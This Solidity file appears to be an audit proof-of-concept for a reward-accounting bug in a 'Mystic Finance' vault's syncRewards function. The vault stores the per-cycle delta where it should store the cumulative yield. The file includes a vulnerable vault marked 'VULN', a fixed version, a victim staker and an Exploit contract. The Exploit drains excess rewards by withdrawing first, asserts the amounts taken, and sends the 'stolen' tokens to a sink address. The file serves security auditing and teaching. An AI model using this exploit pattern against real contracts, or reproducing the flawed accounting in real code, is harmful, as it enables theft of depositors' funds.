// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

/*
 * AuditVault 57712 — Mystic Finance syncRewards (Kann).
 * nextRewards = yieldEth - lastRewardAmount, then lastRewardAmount is set to
 * nextRewards instead of the cumulative yield. By cycle 3 the booked rewards
 * are 20 ether on 10 ether of new yield. The first withdrawer takes 20 ether
 * and the equal staker is left with 10 of the 30 ether actually deposited.
 */

contract MiniToken {
    string public name = "Yield";
    string public symbol = "YLD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _move(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _move(from, to, amount);
        return true;
    }

    function _move(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract RewardsVault {
    MiniToken public immutable yieldToken;
    uint256 public lastRewardAmount;
    uint256 public accountedRewards;
    uint256 public accPerShare;
    uint256 public totalShares;
    mapping(address => uint256) public shares;
    mapping(address => uint256) public rewardDebt;
    mapping(address => uint256) public accrued;
    mapping(address => uint256) public paid;

    constructor(MiniToken _yieldToken) {
        yieldToken = _yieldToken;
    }

    function join() external {
        require(shares[msg.sender] == 0, "joined");
        shares[msg.sender] = 1;
        totalShares += 1;
    }

    function donate(uint256 amount) external {
        yieldToken.transferFrom(msg.sender, address(this), amount);
    }

    function syncRewards() external {
        uint256 yieldEth = yieldToken.balanceOf(address(this));
        uint256 nextRewards = yieldEth - lastRewardAmount;
        accountedRewards += nextRewards;
        if (totalShares > 0 && nextRewards > 0) {
            accPerShare += nextRewards * 1e18 / totalShares;
        }
        // @> VULN: lastRewardAmount stores the cycle delta, not cumulative yieldEth
        lastRewardAmount = nextRewards;
    }

    function withdraw() external {
        _poke(msg.sender);
        uint256 amt = accrued[msg.sender];
        accrued[msg.sender] = 0;
        uint256 bal = yieldToken.balanceOf(address(this));
        uint256 pay = amt > bal ? bal : amt;
        if (pay > 0) yieldToken.transfer(msg.sender, pay);
        paid[msg.sender] += pay;
    }

    function _poke(address user) internal {
        uint256 sh = shares[user];
        uint256 pending = sh * accPerShare / 1e18 - rewardDebt[user];
        accrued[user] += pending;
        rewardDebt[user] = sh * accPerShare / 1e18;
    }
}

contract RewardsVaultFixed {
    MiniToken public immutable yieldToken;
    uint256 public lastRewardAmount;
    uint256 public accountedRewards;
    uint256 public accPerShare;
    uint256 public totalShares;
    mapping(address => uint256) public shares;
    mapping(address => uint256) public rewardDebt;
    mapping(address => uint256) public accrued;
    mapping(address => uint256) public paid;

    constructor(MiniToken _yieldToken) {
        yieldToken = _yieldToken;
    }

    function join() external {
        require(shares[msg.sender] == 0, "joined");
        shares[msg.sender] = 1;
        totalShares += 1;
    }

    function donate(uint256 amount) external {
        yieldToken.transferFrom(msg.sender, address(this), amount);
    }

    function syncRewards() external {
        uint256 yieldEth = yieldToken.balanceOf(address(this));
        uint256 nextRewards = yieldEth - lastRewardAmount;
        accountedRewards += nextRewards;
        if (totalShares > 0 && nextRewards > 0) {
            accPerShare += nextRewards * 1e18 / totalShares;
        }
        lastRewardAmount = yieldEth;
    }

    function withdraw() external {
        uint256 sh = shares[msg.sender];
        uint256 pending = sh * accPerShare / 1e18 - rewardDebt[msg.sender];
        accrued[msg.sender] += pending;
        rewardDebt[msg.sender] = sh * accPerShare / 1e18;
        uint256 amt = accrued[msg.sender];
        accrued[msg.sender] = 0;
        if (amt > 0) yieldToken.transfer(msg.sender, amt);
        paid[msg.sender] += amt;
    }
}

contract VictimStaker {
    function join(RewardsVault v) external {
        v.join();
    }

    function joinFixed(RewardsVaultFixed v) external {
        v.join();
    }

    function withdraw(RewardsVault v) external {
        v.withdraw();
    }

    function withdrawFixed(RewardsVaultFixed v) external {
        v.withdraw();
    }
}

contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;
    uint256 public constant CYCLE = 10 ether;

    MiniToken public yieldToken;
    RewardsVault public vault;
    VictimStaker public victim;
    uint256 public accounted;
    uint256 public attackerPaid;
    uint256 public victimPaid;
    uint256 public stolen;

    constructor() {
        yieldToken = new MiniToken();
        vault = new RewardsVault(yieldToken);
        victim = new VictimStaker();
    }

    function run() external {
        vault.join();
        victim.join(vault);
        yieldToken.mint(address(this), CYCLE * 3);
        yieldToken.approve(address(vault), type(uint256).max);
        vault.donate(CYCLE);
        vault.syncRewards();
        uint256 lastAfterCycle1 = vault.lastRewardAmount();
        vault.donate(CYCLE);
        vault.syncRewards();
        uint256 lastAfterCycle2 = vault.lastRewardAmount();
        vault.donate(CYCLE);
        vault.syncRewards();
        uint256 lastAfterCycle3 = vault.lastRewardAmount();
        accounted = vault.accountedRewards();
        vault.withdraw();
        victim.withdraw(vault);
        attackerPaid = vault.paid(address(this));
        victimPaid = vault.paid(address(victim));
        stolen = attackerPaid - 15 ether;
        require(lastAfterCycle1 == 10 ether, "c1");
        require(lastAfterCycle2 == 10 ether, "c2 stale");
        require(lastAfterCycle3 == 20 ether, "c3 inflated");
        require(accounted == 40 ether, "accounted");
        require(attackerPaid == 20 ether, "attacker");
        require(victimPaid == 10 ether, "victim");
        require(stolen == 5 ether, "stolen");
        yieldToken.transfer(SINK, stolen);
        require(yieldToken.balanceOf(SINK) == 5 ether, "sink");
    }
}
